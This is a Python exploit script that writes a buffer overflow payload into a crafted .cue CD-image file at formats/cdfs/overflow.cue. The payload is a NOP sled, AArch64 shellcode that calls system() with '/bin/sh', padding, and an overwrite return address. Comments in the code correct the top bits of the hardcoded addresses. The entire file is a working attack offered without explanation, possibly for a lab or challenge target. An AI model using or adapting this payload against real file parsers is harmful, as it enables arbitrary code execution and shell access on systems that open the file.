#!/usr/bin/env python3
import struct

binsh_addr = 0xfffffffff23f
system_addr = 0xfffff7e3cec4

print(f"/bin/sh:  {hex(binsh_addr)} (top bits: {hex((binsh_addr >> 48) & 0xffff)})")
print(f"system(): {hex(system_addr)} (top bits: {hex((system_addr >> 48) & 0xffff)})")

# Notice: /bin/sh top bits are 0x0000, system top bits are also 0x0000
# But we've been setting them to 0xffff!

shellcode = (
    # Build /bin/sh in x0: 0x0000fffffffff23f
    b"\xe0\x47\x9e\xd2"  # movz x0, #0xf23f
    b"\xe0\xff\xbf\xf2"  # movk x0, #0xffff, lsl #16
    b"\xe0\xff\xdf\xf2"  # movk x0, #0xffff, lsl #32
    # DON'T set top bits - leave as 0!
    # b"\xe0\xff\xff\xf2"  # movk x0, #0xffff, lsl #48 <- REMOVE THIS
    
    # Build system() in x30: 0x0000fffff7e3cec4
    b"\x9e\x9d\x99\xd2"  # movz x30, #0xcec4
    b"\x7e\xfc\xbe\xf2"  # movk x30, #0xf7e3, lsl #16
    b"\xfe\xff\xdf\xf2"  # movk x30, #0xffff, lsl #32
    # DON'T set top bits!
    # b"\xfe\xff\xff\xf2"  # movk x30, #0xffff, lsl #48 <- REMOVE THIS
    
    # ret
    b"\xc0\x03\x5f\xd6"
)

print(f"\nShellcode: {shellcode.hex()}")
print(f"No nulls: {b'\\x00' not in shellcode}")

nop = b"\x1f\x20\x03\xd5"
nop_sled = nop * 400

payload = nop_sled + shellcode
payload = payload.ljust(2144, b"A")
payload += b"\x48\xe3\xff\xff\xff\xff\xff\xff"

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

print("âœ“ Corrected - top bits left as 0!")
